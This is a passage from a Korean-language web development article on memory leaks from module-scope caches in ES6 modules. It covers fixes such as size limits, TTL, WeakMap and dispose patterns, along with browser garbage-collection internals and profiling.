</span><span class="code-line line-number" line="2"><span class="token keyword">const</span> cache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ← 이 Map은 절대 해제되지 않음!</span>
</span><span class="code-line line-number" line="3">
</span><span class="code-line line-number" line="4"><span class="token keyword module">export</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="5">  cache<span class="token punctuation">.</span><span class="token method function property-access">set</span><span class="token punctuation">(</span><span class="token known-class-name class-name">Date</span><span class="token punctuation">.</span><span class="token method function property-access">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ← 호출할 때마다 계속 추가</span>
</span><span class="code-line line-number" line="6">  <span class="token keyword control-flow">return</span> <span class="token function">processData</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="7"><span class="token punctuation">}</span>
</span><span class="code-line line-number" line="8">
</span><span class="code-line line-number" line="9"><span class="token comment">// 사용하는 곳</span>
</span><span class="code-line line-number" line="10"><span class="token keyword module">import</span> <span class="token imports"><span class="token punctuation">{</span> process <span class="token punctuation">}</span></span> <span class="token keyword module">from</span> <span class="token string">&#x27;./your-module.js&#x27;</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="11">
</span><span class="code-line line-number" line="12"><span class="token comment">// 10,000번 호출하면 cache에 10,000개 항목이 영구 저장!</span>
</span><span class="code-line line-number" line="13"><span class="token keyword control-flow">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="14">  <span class="token function">process</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">data-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>i<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="15"><span class="token punctuation">}</span>
</span><span class="code-line line-number" line="16"><span class="token comment">// → 모든 데이터가 페이지 이동 전까지 메모리에 남아있음</span>
</span></code></pre></div></div>
<h4 id="-최악의-케이스-장시간-실행-spa">💀 최악의 케이스: 장시간 실행 SPA</h4>
<ul>
<li><strong>24/7 SPA 앱</strong>: 사용자가 탭을 계속 열어둠</li>
<li><strong>매분 API 호출</strong>: 1일 = 1,440개, 1달 = 43,200개 캐시 항목</li>
<li><strong>예상 메모리 사용량</strong>: 2GB+</li>
<li><strong>결과</strong>: 브라우저 크래시! 💥</li>
</ul>
<h4 id="-메모리-누수-방지-해결책">✅ 메모리 누수 방지 해결책</h4>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 1. 크기 제한 (LRU 캐시 패턴)</span>
</span><span class="code-line line-number" line="2"><span class="token keyword">const</span> cache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="3"><span class="token keyword">const</span> <span class="token constant">MAX_SIZE</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="4">
</span><span class="code-line line-number" line="5"><span class="token keyword module">export</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="6">  <span class="token keyword control-flow">if</span> <span class="token punctuation">(</span>cache<span class="token punctuation">.</span><span class="token property-access">size</span> <span class="token operator">&gt;=</span> <span class="token constant">MAX_SIZE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="7">    <span class="token keyword">const</span> firstKey <span class="token operator">=</span> cache<span class="token punctuation">.</span><span class="token method function property-access">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token property-access">value</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="8">    cache<span class="token punctuation">.</span><span class="token method function property-access">delete</span><span class="token punctuation">(</span>firstKey<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// FIFO: 가장 오래된 항목 삭제</span>
</span><span class="code-line line-number" line="9">  <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="10">  cache<span class="token punctuation">.</span><span class="token method function property-access">set</span><span class="token punctuation">(</span><span class="token known-class-name class-name">Date</span><span class="token punctuation">.</span><span class="token method function property-access">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="11">  <span class="token keyword control-flow">return</span> <span class="token function">processData</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="12"><span class="token punctuation">}</span>
</span><span class="code-line line-number" line="13">
</span><span class="code-line line-number" line="14"><span class="token comment">// 2. TTL (Time To Live) 구현</span>
</span><span class="code-line line-number" line="15"><span class="token keyword">const</span> <span class="token constant">TTL</span> <span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">;</span> <span class="token comment">// 5분</span>
</span><span class="code-line line-number" line="16"><span class="token keyword">const</span> cache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="17">
</span><span class="code-line line-number" line="18"><span class="token keyword module">export</span> <span class="token keyword">function</span> <span class="token function">processWithTTL</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="19">  <span class="token comment">// 만료된 항목 정리</span>
</span><span class="code-line line-number" line="20">  <span class="token keyword">const</span> now <span class="token operator">=</span> <span class="token known-class-name class-name">Date</span><span class="token punctuation">.</span><span class="token method function property-access">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="21">  <span class="token keyword control-flow">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> value<span class="token punctuation">]</span> <span class="token keyword">of</span> cache<span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="22">    <span class="token keyword control-flow">if</span> <span class="token punctuation">(</span>now <span class="token operator">-</span> value<span class="token punctuation">.</span><span class="token property-access">timestamp</span> <span class="token operator">&gt;</span> <span class="token constant">TTL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="23">      cache<span class="token punctuation">.</span><span class="token method function property-access">delete</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="24">    <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="25">  <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="26">  cache<span class="token punctuation">.</span><span class="token method function property-access">set</span><span class="token punctuation">(</span>now<span class="token punctuation">,</span> <span class="token punctuation">{</span> data<span class="token punctuation">,</span> <span class="token literal-property property">timestamp</span><span class="token operator">:</span> now <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="27">  <span class="token keyword control-flow">return</span> <span class="token function">processData</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="28"><span class="token punctuation">}</span>
</span><span class="code-line line-number" line="29">
</span><span class="code-line line-number" line="30"><span class="token comment">// 3. 명시적 정리 메서드 제공</span>
</span><span class="code-line line-number" line="31"><span class="token keyword module">export</span> <span class="token keyword">function</span> <span class="token function">clearCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="32">  cache<span class="token punctuation">.</span><span class="token method function property-access">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="33"><span class="token punctuation">}</span>
</span><span class="code-line line-number" line="34">
</span><span class="code-line line-number" line="35"><span class="token comment">// 4. WeakMap 활용 (객체 키만 가능)</span>
</span><span class="code-line line-number" line="36"><span class="token keyword">const</span> weakCache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WeakMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="37"><span class="token keyword module">export</span> <span class="token keyword">function</span> <span class="token function">processWithWeakMap</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="38">  weakCache<span class="token punctuation">.</span><span class="token method function property-access">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// obj가 GC되면 자동 정리</span>
</span><span class="code-line line-number" line="39">  <span class="token keyword control-flow">return</span> <span class="token function">processData</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="40"><span class="token punctuation">}</span>
</span></code></pre></div></div>
<h4 id="-핵심-교훈">🎯 핵심 교훈</h4>
<p><strong>ES6 모듈에서 <code>Map</code>, <code>Set</code>, <code>Array</code> 등을 모듈 스코프에 선언할 때는 반드시:</strong></p>
<ul>
<li>✅ 크기 제한 구현</li>
<li>✅ TTL 메커니즘 추가</li>
<li>✅ 명시적 정리 함수 제공</li>
<li>✅ 가능하면 WeakMap/WeakSet 사용 고려</li>
</ul>
<p>모듈 스코프 이벤트 리스너는 특히 교활한 누수 패턴을 나타냅니다. 모듈이 지속되므로, 모듈 스코프에서 연결된 모든 이벤트 리스너는 애플리케이션의 생명주기 동안 활성 상태로 남아있어, 잠재적으로 큰 객체나 DOM 요소에 대한 참조를 보유할 수 있습니다.</p>
<h2 id="실용적-영향">실용적 영향</h2>
<h3 id="모듈이-실제로-가비지-컬렉션되는-경우-vs-지속되는-경우">모듈이 실제로 가비지 컬렉션되는 경우 vs 지속되는 경우</h3>
<p>가혹한 현실: <strong>ES6 모듈은 JavaScript 영역의 생명주기 동안 개별적으로 가비지 컬렉션되지 않습니다</strong>. 동적 import조차도 식별자별로 영구적으로 캐시됩니다. 이는 누적된 모듈 참조가 상당한 메모리 증가를 야기할 수 있는 장시간 실행 애플리케이션에 깊은 영향을 미칩니다.</p>
<p>단일 페이지 애플리케이션의 경우, 라우트 기반 동적 import가 시간이 지나면서 정리 없이 누적됩니다. 모듈 스코프 클로저는 큰 객체에 대한 참조를 무한정 보유합니다. 실제 정리는 페이지 이동에서만 발생하므로, 사용자가 장시간 열어두는 애플리케이션에서는 메모리 관리가 중요해집니다.</p>
<h3 id="spa-컨텍스트와-모듈-메모리-동작">SPA 컨텍스트와 모듈 메모리 동작</h3>
<p>개발 환경에서 핫 모듈 교체(Hot Module Replacement, HMR)는 추가적인 메모리 문제를 야기합니다. Webpack의 HMR은 모듈 교체 시 이전 모듈 참조를 완전히 정리하지 못해 여러 재로드 사이클에 걸쳐 메모리가 누적됩니다. Vite의 네이티브 ESM 접근법이 더 깨끗한 HMR을 제공하지만, ES6 모듈의 근본적인 지속성 특성은 여전히 남아있습니다.</p>
<p>모듈 페더레이션은 공유 모듈이 복잡한 참조 체인을 만드는 추가적인 복잡성을 도입합니다. 원격 진입점은 애플리케이션 생명주기 동안 지속되고, 버전 불일치는 중복 모듈 로딩을 야기하여 메모리 사용량을 더욱 증가시킬 수 있습니다.</p>
<h3 id="메모리-관리를-위한-모범-사례">메모리 관리를 위한 모범 사례</h3>
<p>효과적인 메모리 관리에는 명시적 생명주기 패턴이 필요합니다:</p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token keyword module">export</span> <span class="token keyword">class</span> <span class="token class-name">FeatureModule</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="2">  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="3">    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">resources</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="4">    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">listeners</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="5">    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">disposed</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="6">  <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="7">  
</span><span class="code-line line-number" line="8">  <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="9">    <span class="token keyword control-flow">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">disposed</span><span class="token punctuation">)</span> <span class="token keyword control-flow">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">&#x27;Module disposed&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="10">    <span class="token comment">// 정리 추적과 함께 리소스 설정</span>
</span><span class="code-line line-number" line="11">    <span class="token keyword">const</span> <span class="token function-variable function">handler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token arrow operator">=&gt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token method function property-access">handleEvent</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="12">    <span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token method function property-access">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#x27;app:event&#x27;</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="13">    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">listeners</span><span class="token punctuation">.</span><span class="token method function property-access">push</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token arrow operator">=&gt;</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="14">      <span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token method function property-access">removeEventListener</span><span class="token punctuation">(</span><span class="token string">&#x27;app:event&#x27;</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="15">    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="16">  <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="17">  
</span><span class="code-line line-number" line="18">  <span class="token function">dispose</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="19">    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">disposed</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="20">    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">resources</span><span class="token punctuation">.</span><span class="token method function property-access">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="21">    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">listeners</span><span class="token punctuation">.</span><span class="token method function property-access">forEach</span><span class="token punctuation">(</span><span class="token parameter">cleanup</span> <span class="token arrow operator">=&gt;</span> <span class="token function">cleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="22">    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">listeners</span><span class="token punctuation">.</span><span class="token property-access">length</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="23">  <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="24"><span class="token punctuation">}</span>
</span></code></pre></div></div>
<p>큰 데이터를 관리할 때는 영구적 캐싱을 피하기 위해 JSON 모듈 import보다 <code>fetch()</code>를 선호하세요. 가비지 컬렉션을 허용하는 객체 연관에는 WeakMap과 WeakSet을 사용하세요. 새로운 객체를 만들기보다는 객체를 재사용하는 리소스 풀링을 구현하세요.</p>
<h3 id="실제-시나리오와-사례-연구">실제 시나리오와 사례 연구</h3>
<p>2020년 Meta의 Facebook.com 재설계는 중요한 모듈 메모리 문제를 드러냈습니다. 모듈 스코프에서 캐시된 React 컴포넌트가 연쇄적인 메모리 누수를 야기했고, 단일 컴포넌트 누수가 전체 Fiber 트리와 DOM 요소를 유지했습니다. 이는 언마운트된 컴포넌트에 대한 React 18의 공격적인 정리 순회로 이어졌습니다.</p>
<p>프로덕션 모듈 페더레이션 배포는 공유 종속성의 여러 버전이 동시에 로드되는 메모리 증가 패턴을 보여주었습니다. 해결책에는 페더레이션 구성에서 엄격한 싱글톤 강제와 신중한 버전 관리가 포함됩니다.</p>
<h2 id="브라우저-구현-세부사항">브라우저 구현 세부사항</h2>
<h3 id="다양한-브라우저의-모듈-메모리-처리-방식">다양한 브라우저의 모듈 메모리 처리 방식</h3>
<p><strong>Chrome V8</strong>은 64비트 시스템에서 메모리 효율성을 위해 압축된 32비트 포인터를 사용합니다. 모듈 바이트코드와 메타데이터는 오래된 세대 힙에 저장되며, 모듈 네임스페이스 객체는 무한정 캐시됩니다. 엔진의 Orinoco 가비지 컬렉터는 일시 정지 시간을 최소화하기 위해 동시 마킹과 증분적 스위핑을 사용합니다.</p>
<p><strong>Firefox SpiderMonkey</strong>는 독립적인 힙 파티션 수집을 허용하는 zone 기반 수집을 구현합니다. 하지만 모듈 상호 연결은 일반적으로 zone에 걸쳐 있어 이 최적화를 제한합니다. 엔진은 V8보다 더 공격적인 증분적 수집을 사용하여 작업을 더 작은 슬라이스로 나눕니다.</p>
<p><strong>Safari JavaScriptCore</strong>는 WebCore 객체에 대한 참조 카운팅과 JavaScript 객체에 대한 보수적 가비지 컬렉션을 결합합니다. 보수적 GC는 힙 객체를 가리키는 스택 주소를 루트로 취급하여, 필요한 것보다 잠재적으로 더 많은 객체를 살려둘 수 있지만 안전성 보장을 제공합니다.</p>
<h3 id="모듈-레지스트리-내부와-구현">모듈 레지스트리 내부와 구현</h3>
<p>모든 브라우저는 모듈 식별자를 키로 사용하는 해시 맵으로 모듈 레지스트리를 구현합니다. V8의 구현에는 일관된 동작을 보장하는 명시적 상태 열거형(<code>kUninstantiated</code>, <code>kInstantiating</code>, <code>kInstantiated</code>, <code>kEvaluating</code>, <code>kEvaluated</code>, <code>kErrored</code>)과 결정적 해결이 포함됩니다.</p>
<p>모듈 네임스페이스 객체는 특수한 속성 해결 의미론을 가진 이국적 객체로 구현됩니다. 원래 모듈 export에 대한 라이브 바인딩을 유지하고, 생성 후 불변 구조를 가지며, 속성 접근이 실제 export 값에 위임되는 프록시 같은 동작을 보입니다.</p>
<h3 id="모듈-메모리-사용량-디버깅과-프로파일링">모듈 메모리 사용량 디버깅과 프로파일링</h3>
<p>Chrome DevTools는 포괄적인 메모리 프로파일링을 제공합니다:</p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 힙 스냅샷에서 모듈 식별하기</span>
</span><span class="code-line line-number" line="2"><span class="token comment">// 1. &quot;Script&quot; 객체 찾기 (모듈 소스 코드)</span>
</span><span class="code-line line-number" line="3"><span class="token comment">// 2. &quot;(compiled code)&quot; 객체 찾기 (JIT 출력)  </span>
</span><span class="code-line line-number" line="4"><span class="token comment">// 3. export 속성으로 모듈 네임스페이스 객체 검색</span>
</span><span class="code-line line-number" line="5"><span class="token comment">// 4. 모듈 레지스트리를 통한 유지 경로 추적</span>
</span></code></pre></div></div>
<p>자동화된 테스트를 위해 가능한 곳에서 Memory API를 활용하세요:</p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">measureModuleMemoryImpact</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="2">  <span class="token keyword">const</span> before <span class="token operator">=</span> <span class="token keyword control-flow">await</span> <span class="token dom variable">performance</span><span class="token punctuation">.</span><span class="token method function property-access">measureUserAgentSpecificMemory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="3">  <span class="token keyword control-flow">await</span> <span class="token keyword module">import</span><span class="token punctuation">(</span><span class="token string">&#x27;./large-module.js&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="4">  <span class="token keyword">const</span> after <span class="token operator">=</span> <span class="token keyword control-flow">await</span> <span class="token dom variable">performance</span><span class="token punctuation">.</span><span class="token method function property-access">measureUserAgentSpecificMemory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="5">  
</span><span class="code-line line-number" line="6">  <span class="token keyword">const</span> increase <span class="token operator">=</span> after<span class="token punctuation">.</span><span class="token property-access">bytes</span> <span class="token operator">-</span> before<span class="token punctuation">.</span><span class="token property-access">bytes</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="7">  <span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">모듈 메모리 영향: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>increase<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> 바이트</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="8"><span class="token punctuation">}</span>
</span></code></pre></div></div>
<h2 id="고급-주제">고급 주제</h2>
<h3 id="동적-import와-가비지-컬렉션-동작">동적 import와 가비지 컬렉션 동작</h3>
<h4 id="-흔한-오해-동적-import는-메모리를-해제한다">❌ 흔한 오해: &quot;동적 import는 메모리를 해제한다&quot;</h4>
<p><strong>동적 import(<code>import()</code>)도 영구 캐싱됩니다!</strong> 정적 import와 동일한 모듈 레지스트리를 사용하므로 한 번 로드된 모듈은 절대 제거되지 않습니다:</p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 첫 번째 호출: 모듈 로드 &amp; 영구 캐싱</span>
</span><span class="code-line line-number" line="2"><span class="token keyword">const</span> module1 <span class="token operator">=</span> <span class="token keyword control-flow">await</span> <span class="token keyword module">import</span><span class="token punctuation">(</span><span class="token string">&#x27;./heavy-module.js&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
</span><span class="code-line line-number" line="3">
</span><span class="code-line line-number" line="4"><span class="token comment">// 두 번째 호출: 캐시에서 즉시 반환 (메모리 추가 사용 X)</span>
</span><span class="code-line line-number" line="5"><span class="token keyword">const</span> module2 <span class="token operator">=</span> <span class="token keyword control-flow">await</span> <span class="token keyword module">import</span><span class="token punctuation">(</span><span class="token string">&#x27;./heavy-module.js&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
</span><span class="code-line line-number" line="6">
</span><span class="code-line line-number" line="7"><span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span>module1 <span class="token operator">===</span> module2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true - 동일한 인스턴스!</span>
</span></code></pre></div></div>
<h4 id="-더-위험한-패턴-쿼리-파라미터로-캐시-우회">🚨 더 위험한 패턴: 쿼리 파라미터로 캐시 우회</h4>
